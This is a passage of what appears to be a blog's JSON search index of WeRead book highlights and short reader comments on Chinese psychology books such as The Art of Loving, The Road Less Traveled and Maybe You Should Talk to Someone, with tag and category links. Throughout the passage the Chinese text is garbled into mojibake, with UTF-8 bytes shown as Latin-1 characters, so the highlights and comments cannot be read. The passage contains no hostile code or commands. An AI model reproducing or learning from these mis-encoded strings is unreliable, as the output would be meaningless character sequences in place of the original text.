filterï¼‰æ¥çœ‹è¿™ä¸ªä¸–ç•Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šå‡ºç°æŸäº›æƒ…ç»ªï¼Œä¼šå¯¹äº‹ä»¶æœ‰ååº”ï¼Œä¸”å‡ºç°æŸäº›å¿ƒç†ç–¾ç—…ã€‚èå£«æ¯”äºšä»¥ä¸‹è¿™å¥è¯åˆšå¥½ç®€è¦åœ°è¯´æ˜äº†è¿™ç§ç°è±¡ï¼šâ€œäº‹æƒ…æ²¡æœ‰å¥½åï¼Œæ˜¯äººçš„æ€æƒ³åœ¨ä½œç¥Ÿã€‚â€æˆ‘å¼€å§‹ç”¨è¿™äº›å¼•è¨€æ¥å¸®åŠ©æˆ‘çš„å­¦ç”Ÿè®°ä½å¿ƒç†å­¦çš„é‡è¦è§‚å¿µï¼ŒåŒæ—¶ï¼Œæˆ‘ä¹Ÿå¼€å§‹æ€è€ƒç±»ä¼¼çš„è§‚å¿µè¿˜æœ‰å“ªäº›ã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:13 ^291189470-7qoQTQuEy äº‹æƒ…å½“ç„¶ä¼šæœ‰å¥½åï¼Œæ€æƒ³ä½œç¥Ÿæ˜¯å¯¹ä¸–ç•Œçš„è®¤çŸ¥ä¸å¤Ÿï¼å¥½çš„äº‹ä¸€å®šæ˜¯èƒ½ä»äººè‡ªç„¶çš„ååº”ä¸­çœ‹å‡ºæ¥çš„ï¼ä½†ä¹Ÿå¯èƒ½å­˜åœ¨çˆ±ä½ çœ¼é‡Œå¥½çš„äº‹åœ¨åˆ«äººçœ¼é‡Œæ˜¯åçš„ï¼&gt; [!quote] å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ æˆ‘çœ‹äº†ä¸å°‘å¤ä»£çš„æ™ºæ…§æ°ä½œï¼Œå…¶ä¸­ä»¥ä¸–ç•Œä¸‰å¤§å¤å…¸æ€æƒ³é¢†åŸŸä¸ºä¸»ï¼šå°åº¦çš„ã€Šå¥¥ä¹‰ä¹¦ã€‹ã€å¤å°åº¦é“å¾·æ–‡æœ¬ã€Šè–„ä¼½æ¢µæ­Œã€‹ï¼Œä¸­å›½çš„ã€Šè®ºè¯­ã€‹ã€ã€Šé“å¾·ç»ã€‹åŠå­Ÿå­ç­‰å…¶ä»–å“²å­¦å®¶çš„è‘—ä½œï¼Œè¿˜æœ‰åœ°ä¸­æµ·æ–‡æ˜çš„ã€Šåœ£ç»ã€‹ã€å¸Œè…ŠåŠç½—é©¬æ—¶ä»£çš„å“²å­¦ã€ä¼Šæ–¯å…°æ•™åœ£æ´ä¹¦ã€Šå¤å…°ç»ã€‹ã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:14 ^291189470-7qoR1fqlF å°çš„æ—¶å€™å¯èƒ½è¿˜èƒ½çœ‹è¿›å»ï¼Œé•¿å¤§äº†ä¸çŸ¥é“ä¸ºå•¥å°±ä¸æ„¿æ„çœ‹è¿™ç§çš„ï¼Œå¯èƒ½æ˜¯å¯¹ç±»ä¼¼ä¹¦ç±æ¯ç‡¥çš„æƒ§æ€•&gt; [!quote] å‰è¨€ 10ä¸ªå¹¸ç¦å‡è®¾ æ¯å½“æˆ‘å‘ç°ä¸€ä¸ªè·Ÿå¿ƒç†å­¦æœ‰å…³çš„ä¸»å¼ â€”â€”æœ‰å…³äººæ€§çš„è¯´æ˜ï¼ŒæŠ‘æˆ–æ˜¯å¿ƒç†å¦‚ä½•è¿ä½œæ—¶ï¼Œæˆ‘å°±ä¼šå†™ä¸‹æ¥ã€‚åªè¦æˆ‘å‘ç°æœ‰æŸä¸ªè§‚å¿µåœ¨ä¸åŒçš„åœ°æ–¹ã€ä¸åŒçš„æ—¶é—´é‡å¤å‡ºç°ï¼Œæˆ‘ä¾¿æŠŠå®ƒåˆ—ä¸ºé‡è¦è§‚å¿µã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:15 ^291189470-7qoR4Z4d3 è¿™çœŸçš„æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„ä¹ æƒ¯ï¼å‘ç°çš„åŒæ—¶ä¹Ÿéœ€è¦è®°å½•æ•´ç†ï¼ æœ‰å…³å¿ƒç†çš„å¤è€æ¯”å–» å¼—æ´›ä¼Šå¾·æå‡ºç›¸å…³çš„æ¨¡å‹ã€‚ä»–æŒ‡å‡ºï¼Œäººæ ¼åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼šè‡ªæˆ‘ï¼ˆegoï¼Œå³æœ‰æ„è¯†ã€ç†æ€§çš„è‡ªæˆ‘ï¼‰ã€è¶…æˆ‘ï¼ˆsuperegoï¼Œå³é“å¾·è‰¯å¿ƒï¼Œæœ‰æ—¶ä¼šè¿‡äºæ‹˜æ³¥äºç¤¾ä¼šè§„èŒƒï¼‰ä»¥åŠæœ¬æˆ‘ï¼ˆidï¼Œå³äº«ä¹çš„æ¬²æœ›ï¼Œå„ç§æ¬²æœ›ï¼Œæ€»æƒ³åŠæ—¶è¡Œä¹ï¼‰ã€‚ â€” åˆ›å»ºäº [[2021-05-19]] 00:32 ^291189470-7qoS98nas ä½œè€…çš„æ¯”å–»ä¹Ÿå¾ˆé€šä¿— äº’æƒ çš„åº”ç”¨ ä½ ä¸€è®©æ­¥ï¼Œå¯¹æ–¹å°±è·Ÿä¼šç€è®©æ­¥ã€‚åœ¨é‡‘èäº¤æ¶‰ä¸­ï¼Œé‚£äº›å…ˆæå‡ºæç«¯è‹›åˆ»çš„æ¡ä»¶ç„¶åå†å¾€åé€€è®©ä¸€æ­¥çš„äººï¼Œä¼šæ¯”é‚£äº›ä¸€å¼€å§‹å°±æå‡ºåˆç†æ¡ä»¶ä¹‹åä¾¿ä¸å†è®©æ­¥çš„äººï¼Œæ›´å®¹æ˜“å®Œæˆäº¤æ˜“ã€‚ â€” åˆ›å»ºäº [[2021-05-25]] 21:06 ^291189470-7qziRHLtC å®éªŒé€šä¿—æ˜“æ‡‚ï¼Œå®è·µå ªæ¯”ç™»å¤©","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å¿ƒç†","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%BF%83%E7%90%86/"}]},{"title":"çˆ±çš„è‰ºæœ¯","date":"2024-08-31T01:35:29.255Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†/çˆ±çš„è‰ºæœ¯-ã€ç¾ã€‘è‰¾é‡Œå¸ŒÂ·å¼—æ´›å§†/","text":"ä½œè€…ï¼šã€ç¾ã€‘è‰¾é‡Œå¸ŒÂ·å¼—æ´›å§† - å†…å®¹ç®€ä»‹ ã€Šçˆ±çš„è‰ºæœ¯ã€‹ ã€Šçˆ±çš„è‰ºæœ¯ã€‹æ˜¯ç¾å›½ç¤¾ä¼šå¿ƒç†å­¦å®¶å’Œå“²å­¦å®¶ã€æ³•å…°å…‹ç¦å­¦æ´¾é‡è¦æˆå‘˜è‰¾é‡Œå¸ŒÂ·å¼—æ´›å§†çš„è‘—åä½œå“ï¼Œè‡ª1956å¹´å‡ºç‰ˆè‡³ä»Šå·²è¢«ç¿»è¯‘æˆä¸‰åäºŒç§æ–‡å­—ï¼Œåœ¨å…¨ä¸–ç•Œç•…é”€ä¸è¡°ã€‚åœ¨æœ¬ä¹¦ä¸­ï¼Œå¼—æ´›å§†è®¤ä¸ºï¼Œçˆ±æƒ…ä¸æ˜¯ä¸€ç§åªéœ€æŠ•å…¥èº«å¿ƒçš„æ„Ÿæƒ…ï¼Œè€Œæ˜¯éœ€è¦åŠªåŠ›å‘å±•è‡ªå·±çš„å…¨éƒ¨ä¸ªæ€§ï¼Œä»¥æ­¤å½¢æˆä¸€ç§åˆ›é€ å€¾å‘ï¼Œå¦åˆ™ï¼Œä¸€åˆ‡çˆ±çš„å°è¯•éƒ½æ˜¯ä¼šå¤±è´¥çš„ã€‚å¦‚æœæ²¡æœ‰çˆ±ä»–äººçš„èƒ½åŠ›ï¼Œä¸èƒ½è°¦æ­ã€å‹‡æ•¢ã€çœŸè¯šã€è‡ªåˆ¶åœ°çˆ±ä»–äººï¼Œå°±ä¸å¯èƒ½å¾—åˆ°æ»¡æ„çš„çˆ±ã€‚å¼—æ´›å§†è¿›è€Œæå‡ºï¼Œçˆ±æ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œæƒ³è¦æŒæ¡è¿™é—¨è‰ºæœ¯çš„äººï¼Œéœ€è¦æœ‰è¿™æ–¹é¢çš„çŸ¥è¯†å¹¶ä»˜å‡ºåŠªåŠ›å»å­¦ä¹ ã€‚æ—¢è¦å­¦ä¹ çˆ±çš„ç†è®ºï¼Œä¹Ÿè¦åœ¨çˆ±çš„å®è·µä¸­å­¦ä¹ ã€‚ çˆ±çš„è‰ºæœ¯ + ã€Šçˆ±çš„è‰ºæœ¯ã€‹ å±æ€§ å†…å®¹ ISBN 9787020145348 ä½œè€… ã€ç¾ã€‘è‰¾é‡Œå¸ŒÂ·å¼—æ´›å§† å‡ºç‰ˆå¹´ 2018-11-01 å‡ºç‰ˆç¤¾ äººæ°‘æ–‡å­¦å‡ºç‰ˆç¤¾ æ¥æº çˆ±çš„è‰ºæœ¯ åˆ†ç±» å¿ƒç†-ç¤¾ä¼šå¿ƒç†å­¦ é«˜äº®åˆ’çº¿ ç¬¬äºŒç«  çˆ±çš„ç†è®º ç¬¬äºŒç«  çˆ±çš„ç†è®º æ²¡æœ‰è¢«çˆ±é‡æ–°ç»“åˆçš„åˆ†ç¦»æ„è¯†æ˜¯ç¾è€»æ„Ÿçš„æ¥æºã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯æœ‰ç½ªæ„Ÿå’Œç„¦è™‘çš„æ¥æºã€‚ â€” åˆ›å»ºäº [[2021-12-15]] 00:15 ^17-1852-1889 ç¬¬äºŒç«  çˆ±çš„ç†è®º äººçš„æœ€æ·±åˆ‡çš„éœ€è¦å°±æ˜¯å…‹æœåˆ†ç¦»ï¼Œä»è€Œä½¿ä»–ä»å­¤ç‹¬çš„å›šç‰¢ä¸­è§£è„±å‡ºæ¥ã€‚ â€” åˆ›å»ºäº [[2021-12-15]] 00:15 ^17-1925-1956 ç¬¬äºŒç«  çˆ±çš„ç†è®º é‡è¦çš„æ˜¯æˆ‘ä»¬è°ˆåŠçˆ±æ—¶çŸ¥é“æˆ‘ä»¬æ‰€è¯´çš„æ˜¯å“ªç§ç»“åˆã€‚æ˜¯ä½œä¸ºå¯¹ç”Ÿå­˜é—®é¢˜æˆç†Ÿçš„å›ç­”è€ŒæåŠçˆ±å‘¢ï¼Œè¿˜æ˜¯å¯è¢«ç§°ä¸ºå…±ç”Ÿæ€§ç»“åˆçš„çˆ±çš„é‚£äº›ä¸æˆç†Ÿå½¢å¼ï¼Ÿ â€” åˆ›å»ºäº [[2021-12-15]] 00:33 ^17-7424-7514","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å¿ƒç†","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%BF%83%E7%90%86/"}]},{"title":"å°‘æœ‰äººèµ°çš„è·¯ï¼ˆ1-8å¥—è£…ï¼‰","date":"2024-08-31T01:35:29.252Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†/å°‘æœ‰äººèµ°çš„è·¯ï¼ˆ1-8å¥—è£…ï¼‰-M.æ–¯ç§‘ç‰¹Â·æ´¾å…‹/","text":"ä½œè€…ï¼šM.æ–¯ç§‘ç‰¹Â·æ´¾å…‹ - å†…å®¹ç®€ä»‹ ã€Šå°‘æœ‰äººèµ°çš„è·¯ï¼ˆ1-8å¥—è£…ï¼‰ã€‹ M.æ–¯ç§‘ç‰¹Â·æ´¾å…‹ï¼ˆM.Scott Peckï¼‰ï¼Œæ¯•ä¸šäºå“ˆä½›å¤§å­¦ï¼Œè·å¾—ç¡•å£«å’Œåšå£«å­¦ä½ã€‚ä»–é•¿æœŸä»äº‹å¿ƒç†æ²»ç–—å®è·µï¼Œå–å¾—äº†å“è‘—æˆç»©ï¼Œè¢«èª‰ä¸ºâ€œæˆ‘ä»¬è¿™ä¸ªæ—¶ä»£æ°å‡ºçš„å¿ƒç†åŒ»ç”Ÿâ€ã€‚ç”±äºå…¶å·¨å¤§çš„å½±å“åŠ›ï¼Œä»–è·å¾—æ”¿åºœç‰¹è®¸ï¼Œè¿›å…¥æ”¿åºœå¿ƒç†æ²»ç–—ç‰¹æ®Šå°ç»„ï¼Œä¸ºè¶Šæˆ˜å£«å…µæä¾›æ²»ç–—ã€‚ä»–è¿˜æ›¾æ¥å—æ´¾é£ï¼Œåœ¨ç¾å†›é©»æ—¥æœ¬å†²ç»³åŸºåœ°æ‹…ä»»å¿ƒç†åŒ»ç”Ÿã€‚è¿™äº›ç‰¹æ®Šçš„èŒä¸šç»å†ï¼Œæˆå°±äº†ä»–ä¼Ÿå¤§çš„è‘—ä½œã€Šå°‘æœ‰äººèµ°çš„è·¯ã€‹ç³»åˆ—ï¼Œè¯¥ä¹¦åœ¨ã€Šçº½çº¦æ—¶æŠ¥ã€‹ç•…é”€ä¹¦æ’è¡Œæ¦œè¿ç»­ä¸Šæ¦œè¿‘20å¹´ï¼Œè¢«è¥¿æ–¹åª’ä½“èª‰ä¸ºâ€œæ¥è‡ªä¸Šå¸ä¹‹æ‰‹â€çš„æ—¶ä»£æ°ä½œã€‚ å°‘æœ‰äººèµ°çš„è·¯ï¼ˆ1-8å¥—è£…ï¼‰ + ã€Šå°‘æœ‰äººèµ°çš„è·¯ï¼ˆ1-8å¥—è£…ï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN null ä½œè€… M.æ–¯ç§‘ç‰¹Â·æ´¾å…‹ å‡ºç‰ˆå¹´ 2020-11-01 å‡ºç‰ˆç¤¾ åŒ—äº¬è”åˆå‡ºç‰ˆå…¬å¸ æ¥æº å°‘æœ‰äººèµ°çš„è·¯ï¼ˆ1-8å¥—è£…ï¼‰ åˆ†ç±» å¿ƒç†-å¿ƒç†å­¦ç ”ç©¶ é«˜äº®åˆ’çº¿ ç¬¬ä¸€éƒ¨åˆ† è‡ªå¾‹ ç¬¬ä¸€éƒ¨åˆ† è‡ªå¾‹ è‡ªå¾‹æ˜¯è§£å†³äººç”Ÿé—®é¢˜æœ€ä¸»è¦çš„å·¥å…·ï¼Œä¹Ÿæ˜¯æ¶ˆé™¤äººç”Ÿç—›è‹¦æœ€é‡è¦çš„æ–¹æ³•ã€‚ â€” åˆ›å»ºäº [[2021-10-24]] 07:45 ^303-430-461","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å¿ƒç†","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%BF%83%E7%90%86/"}]},{"title":"ä¹Ÿè®¸ä½ è¯¥æ‰¾ä¸ªäººèŠèŠ","date":"2024-08-31T01:35:29.249Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†/ä¹Ÿè®¸ä½ è¯¥æ‰¾ä¸ªäººèŠèŠ-æ´›è‰Â·æˆˆç‰¹åˆ©å¸ƒ/","text":"ä½œè€…ï¼šæ´›è‰Â·æˆˆç‰¹åˆ©å¸ƒ - å†…å®¹ç®€ä»‹ ã€Šä¹Ÿè®¸ä½ è¯¥æ‰¾ä¸ªäººèŠèŠã€‹ è¿™æ˜¯ä¸€ä½å¿ƒç†æ²»ç–—å¸ˆçš„å›å¿†å½•ï¼Œè®²è¿°äº†å‘ç”Ÿåœ¨è¯Šå®¤ä¸­çš„æ•…äº‹ã€‚åœ¨è¿™ä¸ªå°å°çš„å¯†é—­ç©ºé—´é‡Œï¼Œäººä»¬ä¼šå±•ç°å‡ºæœ€çœŸå®ã€æœ€è„†å¼±çš„ä¸€é¢ï¼›ä¹Ÿæ˜¯åœ¨è¿™é‡Œï¼Œäººä»¬è·å¾—äº†é™ªä¼´å’Œå€¾å¬ï¼Œä¹Ÿè·å¾—äº†å®è´µçš„è§‰å¯Ÿã€æˆé•¿ä¸æ”¹å˜ã€‚åœ¨ä¹¦ä¸­ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å››ä¸ªæ¥è®¿è€…çš„æ•…äº‹ï¼Œä»–ä»¬æ˜¯ï¼šä¸€ä¸ªå››åå¤šå²ã€äº‹ä¸šæˆåŠŸã€è‡ªä»¥ä¸ºæ˜¯ï¼Œè®¤ä¸ºèº«è¾¹æ‰€æœ‰äººéƒ½æ˜¯è ¢è´§çš„å¥½è±ååˆ¶ç‰‡äººï¼›ä¸€ä¸ªä¸‰åå¤šå²ã€åˆšåˆšæ–°å©šå°±è¢«è¯Šæ–­å‡ºæ‚£æœ‰ç»ç—‡ï¼Œæ—¶æ—¥ä¸å¤šçš„å¤§å­¦å¥³æ•™å¸ˆï¼›ä¸€ä¸ªå…­åä¹å²ã€ç¦»è¿‡ä¸‰æ¬¡å©šï¼Œæ„Ÿè§‰å­¤ç‹¬ç»æœ›ï¼Œå£°ç§°ç”Ÿæ´»å†ä¸å¥½è½¬å°±è¦åœ¨ä¸ƒåå²ç”Ÿæ—¥å½“å¤©è‡ªæ€çš„è€å¤ªå¤ªï¼›ä¸€ä¸ªäºŒåå¤šå²ã€æœ‰åŸç”Ÿå®¶åº­åˆ›ä¼¤å’Œé…—é…’é—®é¢˜ï¼Œåœ¨çˆ±æƒ…ä¸­é¢‘é¢‘å—æŒ«çš„å§‘å¨˜ã€‚åŒæ—¶ï¼Œä¹¦ä¸­è¿˜æœ‰ç¬¬äº”ä¸ªå¯»æ±‚å¸®åŠ©çš„äººï¼Œé‚£å°±æ˜¯æ²»ç–—å¸ˆè‡ªå·±ã€‚å¥¹æ˜¯ä¸€ä¸ªå•èº«çš„èŒåœºå¦ˆå¦ˆï¼Œå››åå¤šå²æ—¶é­é‡å¤±æ‹ï¼Œå‡ ä¹å´©æºƒã€‚æœ‰æœ‹å‹å¯¹å¥¹è¯´â€œæˆ–è®¸ä½ è¯¥æ‰¾ä¸ªäººèŠèŠâ€ï¼Œäºæ˜¯å¥¹ä¹Ÿç»™è‡ªå·±æ‰¾äº†ä¸€ä½å¿ƒç†æ²»ç–—å¸ˆã€‚å½“å¥¹åˆ‡æ¢åˆ°æ¥è®¿è€…çš„ä½ç½®ï¼Œååˆ°å¦ä¸€ä½å¿ƒç†æ²»ç–—å¸ˆçš„æ²™å‘ä¸Šè¯‰è¯´è‡ªå·±å†…å¿ƒçš„è„†å¼±ä¸æ‚²ä¼¤ï¼Œå°±æ›´èƒ½æ„Ÿå—åˆ°å¿ƒç†æ²»ç–—ä¸ºä½•å…·æœ‰æ²»æ„ˆå’Œæ”¹å˜çš„åŠ›é‡ã€‚è¿™æœ¬ä¹¦ä»æ²»ç–—å¸ˆå’Œæ¥è®¿è€…çš„åŒé‡è§†è§’å±•ç°äº†å¿ƒç†æ²»ç–—çš„è¿‡ç¨‹ï¼Œè®©æˆ‘ä»¬å‘ç°ï¼šæ— è®ºèº«ä»½èƒŒæ™¯æœ‰å¤šç›¸å¼‚ï¼Œäººç±»é¢å¯¹çš„çƒ¦æ¼å…¶å®éƒ½ç›¸é€šâ€”â€”çˆ±ä¸è¢«çˆ±ã€é—æ†¾ã€é€‰æ‹©ã€æ§åˆ¶ã€ä¸ç¡®å®šã€æ­»äº¡ï¼Œè¿™äº›éƒ½æ˜¯æˆ‘ä»¬èº«è€Œä¸ºäººå¿…é¡»å…±åŒå­¦ä¹ é¢å¯¹çš„è®®é¢˜ã€‚æˆ‘ä»¬åœ¨ç°å®ç”Ÿæ´»ä¸­æ‰€é­é‡çš„åˆ‡è‚¤ä¹‹ç—›å’Œç”Ÿå‘½å›°å¢ƒï¼Œéƒ½èƒ½åœ¨è¿™æœ¬ä¹¦ä¸­å¾—åˆ°å…±é¸£ã€æ‰¾åˆ°å¸Œæœ›ã€‚ ä¹Ÿè®¸ä½ è¯¥æ‰¾ä¸ªäººèŠèŠ + ã€Šä¹Ÿè®¸ä½ è¯¥æ‰¾ä¸ªäººèŠèŠã€‹ å±æ€§ å†…å®¹ ISBN 9787553522838 ä½œè€… æ´›è‰Â·æˆˆç‰¹åˆ©å¸ƒ å‡ºç‰ˆå¹´ 2021-06-01 å‡ºç‰ˆç¤¾ ä¸Šæµ·æ–‡åŒ–å‡ºç‰ˆç¤¾ æ¥æº ä¹Ÿè®¸ä½ è¯¥æ‰¾ä¸ªäººèŠèŠ åˆ†ç±» å¿ƒç†-å¿ƒç†å­¦åº”ç”¨ é«˜äº®åˆ’çº¿ åº å½“ç—›è‹¦å¯ä»¥è¢«è¨€è¯´ åº å½“ç—›è‹¦å¯ä»¥è¢«è¨€è¯´ æ´›è‰çš„æ•…äº‹ï¼Œæ‰€æœ‰äººçš„æ•…äº‹ï¼Œè¯´åˆ°åº•éƒ½æ˜¯åŒä¸€ä»¶äº‹â€”â€”æˆ‘ä»¬æ— æ³•é€ƒé¿ç—›è‹¦ï¼Œåªèƒ½æ‰¿è®¤ã€‚ â€” åˆ›å»ºäº [[2022-01-22]] 19:02 ^71-4463-4501 åº å½“ç—›è‹¦å¯ä»¥è¢«è¨€è¯´ æ‰¿è®¤æœ¬èº«ï¼Œå°±æ˜¯æœ€éšè”½ä¹Ÿæœ€å…³é”®çš„æ”¹å˜ã€‚ â€” åˆ›å»ºäº [[2022-01-22]] 19:02 ^71-4530-4548 åº å½“ç—›è‹¦å¯ä»¥è¢«è¨€è¯´ å½“ç—›è‹¦ç»ˆäºè¢«è¨€è¯´ï¼Œäººä»¬æ‰èƒ½è·å¾—æœ€åŸºæœ¬çš„å‹‡æ°”ï¼Œå»çœ‹ã€å»æ„ŸçŸ¥ã€å»ä¿¡ä»»ã€‚æˆ‘ä»¬æ‰æœ‰å‹‡æ°”ä»å¯¹æ–¹çœ¼ç›é‡Œçœ‹åˆ°è‡ªå·±åœ¨åšä»€ä¹ˆï¼Œä¹Ÿæœ‰æ™ºæ…§å»æ€è€ƒä¸ºä»€ä¹ˆåšï¼Œæˆ–è€…ï¼Œè¿˜å­˜åœ¨å“ªäº›ä¸åŒçš„é€‰æ‹©ã€‚è¯­è¨€è®©æˆ‘ä»¬æ²‰é™ï¼Œä¸æ€¥ç€æ”¹å˜ï¼Œè€Œæ˜¯å‚¨å¤‡æ—¶é—´ä¸èƒ½æºã€‚äº¤è°ˆè®©æˆ‘ä»¬æ¥çº³è‡ªå·±ï¼Œæ¥çº³è‡ªå·±çš„ç—›è‹¦ï¼Œä¹Ÿæ¥çº³æˆ‘ä»¬ç”¨æ¥é€ƒé¿ç—›è‹¦çš„å¾’åŠ³æ— åŠŸçš„å°è¯•ã€‚ç­‰åšå¥½å‡†å¤‡ï¼Œå®ƒä¼šè½¬å˜æˆæ›´ç§¯æçš„è¡Œä¸ºã€‚ â€” åˆ›å»ºäº [[2022-01-22]] 19:02 ^71-4618-4778 åº å½“ç—›è‹¦å¯ä»¥è¢«è¨€è¯´ ä¸è¦å¿ƒå­˜å¹»æƒ³ã€‚è¿™ä¸ªä¸–ç•Œæ²¡æœ‰å¥‡è¿¹ã€‚ä½ æ— æ³•é€ƒé¿ä½ æ‰€é‡åˆ°çš„ç—›è‹¦ï¼Œå¿ƒç†å­¦ä¹Ÿä¸èƒ½æä¾›ä»»ä½•å¹»æƒ³ï¼Œä½†ä¸è¦å¿˜äº†ï¼Œä¸–ç•Œä¸Šä¹Ÿæœ‰è¿™æ ·çš„åœ°æ–¹ï¼Œæœ‰è¿™æ ·ä¸€äº›äººï¼Œå¯ä»¥ç›´é¢è¿™ä¸ªæ— å¤„å¯é€ƒçš„ã€å›°æƒ‘çš„ã€ç—›è‹¦çš„ä½ ã€‚ä½ ä»¬ååœ¨ä¸€èµ·ï¼Œéšä¾¿è°ˆè°ˆã€‚ä½ å¯ä»¥è¨€è¯´çœŸå®çš„ä½ ï¼Œè€Œè¿™å°±æ˜¯å¿ƒç†å’¨è¯¢çš„å¥‡è¿¹æ‰€åœ¨ã€‚ â€” åˆ›å»ºäº [[2022-01-22]] 19:03 ^71-4937-5060 1 åˆ°å¤„æ˜¯è ¢è´§ 1 åˆ°å¤„æ˜¯è ¢è´§ å˜åŒ–ä¹Ÿå¸¸å¸¸ä¼´éšç€å¤±å»ã€‚æ— æ‰€å¤±åˆ™ä¸å¾—å˜ï¼Œæ­£å› å¦‚æ­¤ï¼Œäººä»¬å¸¸å¸¸è¯´ç€è¦å»æ”¹å˜ï¼Œå´ä¾ç„¶é©»è¶³åŸåœ°ã€‚ â€” åˆ›å»ºäº [[2022-01-22]] 19:09 ^74-4177-4220","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"å¿ƒç†","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å¿ƒç†","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E5%BF%83%E7%90%86/"}]},{"title":"é€†æ€ç»´é€»è¾‘ï¼šä½ çš„ä¸–ç•Œçš†æœ‰å¯èƒ½","date":"2024-08-31T01:35:29.248Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/å“²å­¦å®—æ•™/é€†æ€ç»´é€»è¾‘ï¼šä½ çš„ä¸–ç•Œçš†æœ‰å¯èƒ½-éƒ‘å°å…°/","text":"ä½œè€…ï¼šéƒ‘å°å…° - å†…å®¹ç®€ä»‹ ã€Šé€†æ€ç»´é€»è¾‘ï¼šä½ çš„ä¸–ç•Œçš†æœ‰å¯èƒ½ã€‹ æ¯ä¸ªäººéƒ½æœ‰æ€ç»´ï¼Œæ€ç»´æ–¹å¼å› 